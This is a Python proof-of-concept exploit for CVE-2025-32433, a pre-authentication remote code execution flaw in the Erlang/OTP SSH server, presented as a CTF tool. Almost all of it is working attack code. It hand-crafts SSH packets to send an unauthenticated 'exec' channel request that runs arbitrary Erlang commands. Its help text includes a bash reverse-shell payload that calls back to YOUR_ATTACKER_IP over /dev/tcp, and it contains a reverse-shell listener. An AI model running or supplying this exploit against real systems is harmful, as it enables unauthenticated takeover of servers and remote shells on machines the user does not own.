import socket
import struct
import time
import argparse
import threading
import sys
import os

# --- Helper Functions ---

def string_payload(s):
    """
    Helper to format SSH string (4-byte length + bytes).
    Encodes the string 's' into UTF-8 bytes and prepends its length as a 4-byte big-endian integer.
    """
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes

def build_channel_open(channel_id=0):
    """
    Builds an SSH_MSG_CHANNEL_OPEN packet for a session channel.
    channel_id: The sender channel ID.
    """
    return (
        b"\x5a" # SSH_MSG_CHANNEL_OPEN message type
        + string_payload("session") # Channel type
        + struct.pack(">I", channel_id) # Sender channel ID
        + struct.pack(">I", 0x68000) # Initial window size (arbitrary large value)
        + struct.pack(">I", 0x10000) # Max packet size (arbitrary large value)
    )

def build_channel_request(channel_id=0, command=None):
    """
    Builds an SSH_MSG_CHANNEL_REQUEST packet with an 'exec' payload.
    channel_id: The channel ID for which the request is intended.
    command: The command string to execute (Erlang shell command).
    """
    if command is None:
        # Default command: Create /tmp/note.txt with "Exploit Ran!"
        command = 'file:write_file("/tmp/note.txt", <<"Exploit Ran!">>).'
    
    return (
        b"\x62" # SSH_MSG_CHANNEL_REQUEST message type
        + struct.pack(">I", channel_id) # Recipient channel ID
        + string_payload("exec") # Request type
        + b"\x01" # want_reply = true (request a response)
        + string_payload(command) # The command payload
    )

def build_kexinit():
    """
    Builds a minimal but valid SSH_MSG_KEXINIT packet for key exchange initiation.
    This uses common algorithms to facilitate the handshake.
    """
    cookie = b"\x00" * 16 # Random bytes, 16-byte cookie

    def name_list(l):
        """Helper to format a comma-separated list of names as an SSH string."""
        return string_payload(",".join(l))

    # Using algorithms observed in common SSH servers (like OpenSSH and Erlang/OTP)
    return (
        b"\x14" # SSH_MSG_KEXINIT message type
        + cookie
        + name_list(
            [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group14-sha256",
            ]
        )  # Kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"]) # Host key algorithms
        + name_list(["aes128-ctr"]) * 2  # Encryption algorithms (client->server, server->client)
        + name_list(["hmac-sha1"]) * 2   # MAC algorithms (client->server, server->client)
        + name_list(["none"]) * 2 # Compression algorithms (none, zlib@openssh.com, zlib)
        + name_list([]) * 2 # Languages (empty lists)
        + b"\x00" # First Kex packet follows (false)
        + struct.pack(">I", 0) # Reserved (ignored)
    )

def pad_packet(payload, block_size=8):
    """
    Pads an SSH packet to align with the specified block_size for encryption.
    payload: The raw SSH message payload.
    block_size: The encryption block size (typically 8 for older SSH, 16 for AES).
    """
    min_padding = 4 # Minimum padding required by SSH protocol
    padding_len = block_size - ((len(payload) + 5) % block_size) # Calculate padding needed
    if padding_len < min_padding:
        padding_len += block_size # Ensure minimum padding is met
    
    return (
        struct.pack(">I", len(payload) + 1 + padding_len) # Packet length
        + bytes([padding_len]) # Padding length byte
        + payload # Actual message payload
        + bytes([0] * padding_len) # Padding bytes (zeros)
    )

# --- Integrated Listener Function ---
def start_integrated_listener(listen_port):
    """
    Starts a basic TCP listener to catch the reverse shell connection.
    Binds to 0.0.0.0 to listen on all available interfaces.
    """
    listen_host = "0.0.0.0" # Bind to all interfaces for flexibility
    print(f"\n[*] Starting integrated listener on {listen_host}:{listen_port} (listening on all interfaces)...")
    try:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((listen_host, listen_port))
        listener.listen(1)
        print("[*] Waiting for incoming reverse shell connection...")
        
        conn, addr = listener.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}! Shell spawned.")
        print("[*] Type 'exit' or 'quit' to close the shell.")
        
        conn.sendall(b"\n")

        def recv_thread_func():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        print("\n[-] Target closed the connection.")
                        os._exit(0)
                    print("[DEBUG_LISTENER] Received data from target ({} bytes):\n{}".format(len(data), data.decode(errors='ignore').strip()))
                    print(data.decode(errors='ignore'), end='')
                    sys.stdout.flush()
                except socket.error as e:
                    print(f"\n[-] Socket error during receive: {e}")
                    os._exit(0)
                except Exception as e:
                    print(f"\n[-] Error in receive thread: {e}")
                    os._exit(0)

        recv_thread = threading.Thread(target=recv_thread_func)
        recv_thread.daemon = True
        recv_thread.start()

        while True:
            try:
                command = input()
                if command.lower() in ("exit", "quit"):
                    break
                print("[DEBUG_LISTENER] Sending command to target: {}".format(command))
                conn.sendall((command + "\n").encode())
            except EOFError:
                print("\n[*] EOF received. Closing shell.")
                break
            except KeyboardInterrupt:
                print("\n[*] Keyboard interrupt. Closing shell.")
                break
            except socket.error as e:
                print(f"\n[-] Socket error during send: {e}")
                break
            except Exception as e:
                print(f"\n[-] Error sending data: {e}")
                break

    except KeyboardInterrupt:
        print("\n[*] Listener setup interrupted.")
    except Exception as e:
        print(f"[!] Listener setup error: {e}. Please ensure the port is not in use and try again.")
    finally:
        if 'conn' in locals() and conn:
            conn.close()
        if 'listener' in locals() and listener:
            listener.close()
        os._exit(0)

# --- Main Exploit Logic ---
def main():
    # ASCII Art for flair!
    print(r"""
   ___ _  _ ___ _  _    ____ ___  ____  ____ _  _ ____
  / __| | | | _ \ | | |  | _ \| _|/ ___|/ ___| | | | __ )
 | (__| |_| | _/ |_| |  | |_) | | | |   | |   | |_| | _ \
  \___|\___/|_| |___/___|  | _ <| | |___| |___| _  | |_) |
                        |_| \_\___|\____|\____|_| |_|____/

      Erlang/OTP SSH Pre-Auth RCE PoC (CVE-2025-32433)
                  For CTF Challenges
    """)

    # Setup argument parser for the --command argument
    parser = argparse.ArgumentParser(
        description="""CVE-2025-32433 Erlang/OTP SSH Pre-Auth RCE PoC for CTF.
        This script exploits a critical vulnerability in Erlang/OTP SSH server
        that allows unauthenticated remote code execution. It's designed for
        ethical hacking and learning within a controlled CTF environment.""",
        formatter_class=argparse.RawTextHelpFormatter # Preserve formatting for help text
    )
    
    parser.add_argument("--command", 
                        default='file:write_file("/tmp/note.txt", <<"Exploit Ran!">>).', 
                        help="""Erlang command to execute on the target.
        Examples:
        - Create a file (default): 'file:write_file("/tmp/note.txt", <<"Exploit Ran!">>).'
        - Execute 'id' and save to file: 'os:cmd("id > /tmp/id_output.txt").'
        - Bash reverse shell: 'os:cmd("bash -i >& /dev/tcp/YOUR_ATTACKER_IP/YOUR_ATTACKER_PORT 0>&1").'
          (REMEMBER TO REPLACE YOUR_ATTACKER_IP and YOUR_ATTACKER_PORT!)
        
        Default: Create /tmp/note.txt""")
    
    args = parser.parse_args()

    # --- Interactive Input for Target Details with Defaults ---
    target_host = input("Enter target IP address (e.g., 127.0.0.1) [10.10.1.100]: ").strip() or "10.10.1.100"
    try:
        target_port = int(input("Enter target port (e.g., 2222) [2222]: ").strip() or "2222")
    except ValueError:
        print("[!] Invalid target port entered. Please enter a valid number.")
        return

    # No attacker IP/port needed if not using reverse shell or listener
    # The script now focuses on non-interactive RCE by default.
    
    # Check if a reverse shell command is explicitly provided via --command
    if "YOUR_ATTACKER_IP" in args.command or "YOUR_ATTACKER_PORT" in args.command:
        print("\n[!!! WARNING !!!] You have provided a reverse shell command.")
        print("                 Please ensure 'YOUR_ATTACKER_IP' and 'YOUR_ATTACKER_PORT'")
        print("                 are replaced with your actual attacking machine's IP and chosen port.")
        print("                 Also, remember to start an external listener (e.g., 'nc -lvnp YOUR_ATTACKER_PORT') manually.")
        print("                 The script no longer includes an integrated listener.\n")
        time.sleep(2) # Give the user time to read the warning


    try:
        with socket.create_connection((target_host, target_port), timeout=5) as s:
            print(f"[*] Connecting to SSH server at {target_host}:{target_port}...")

            # 1. Banner exchange
            client_banner = b"SSH-2.0-OpenSSH_8.9\r\n"
            print(f"[DEBUG_EXPLOIT] Sending client banner (len: {len(client_banner)}): {client_banner!r}")
            s.sendall(client_banner)
            
            server_banner = s.recv(1024)
            print(f"[DEBUG_EXPLOIT] Received server banner (len: {len(server_banner)}): {server_banner!r}")
            print(f"[+] Received banner: {server_banner.strip().decode(errors='ignore')}")
            time.sleep(0.5)

            # 2. Send SSH_MSG_KEXINIT
            print("[*] Sending SSH_MSG_KEXINIT...")
            kex_packet = build_kexinit()
            padded_kex_packet = pad_packet(kex_packet)
            print(f"[DEBUG_EXPLOIT] Sending KEXINIT packet (padded len: {len(padded_kex_packet)}): {padded_kex_packet.hex()}")
            s.sendall(padded_kex_packet)
            time.sleep(0.5)

            # 3. Send SSH_MSG_CHANNEL_OPEN
            print("[*] Sending SSH_MSG_CHANNEL_OPEN...")
            chan_open = build_channel_open()
            padded_chan_open = pad_packet(chan_open)
            print(f"[DEBUG_EXPLOIT] Sending CHANNEL_OPEN packet (padded len: {len(padded_chan_open)}): {padded_chan_open.hex()}")
            s.sendall(padded_chan_open)
            time.sleep(0.5)

            # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-authentication!)
            print(f"[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth) with command: '{args.command}'...")
            chan_req = build_channel_request(command=args.command)
            padded_chan_req = pad_packet(chan_req)
            print(f"[DEBUG_EXPLOIT] Sending CHANNEL_REQUEST packet (padded len: {len(padded_chan_req)}): {padded_chan_req.hex()}")
            s.sendall(padded_chan_req)

            print("[✓] Exploit sent! If the server is vulnerable, check the target for the result (e.g., /tmp/note.txt).")

            try:
                response = s.recv(1024)
                print(f"[DEBUG_EXPLOIT] Received response from target after exploit (len: {len(response)}): {response.hex()}")
                print(f"[+] Received response from target after exploit: {response.hex()}")
            except socket.timeout:
                print("[*] No immediate response from target after exploit (often expected with non-interactive payloads).")
            except Exception as e:
                print(f"[!] Error receiving final response: {e}")

    except ConnectionRefusedError:
        print(f"[!] Connection refused. Is the target server running on {target_host}:{target_port} and accessible from your machine?")
        print(f"[DEBUG_EXPLOIT] Ensure target firewall allows inbound connections on {target_port}.")
    except socket.timeout:
        print(f"[!] Connection timed out. Target at {target_host}:{target_port} did not respond within the expected time.")
        print("[DEBUG_EXPLOIT] This might indicate network issues or the target closing the connection quickly.")
    except Exception as e:
        print(f"[!] An unexpected error occurred during exploit sending: {e}")

if __name__ == "__main__":
    main()
